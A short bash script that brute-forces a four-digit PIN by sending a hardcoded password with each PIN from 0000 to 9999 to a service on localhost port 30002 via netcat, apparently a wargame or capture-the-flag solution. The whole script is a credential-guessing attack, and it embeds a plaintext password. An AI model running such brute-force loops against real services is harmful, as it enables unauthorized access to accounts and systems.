#!/bin/bash
i=0
pass="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
while [ $i -lt 10000 ]
do
        pin=`printf %04d $i`
        echo  "Attempting pin $pin"
        ((i++))
        # create query line:
        attempt="$pass $pin"
        echo "$attempt" | nc localhost 30002
done
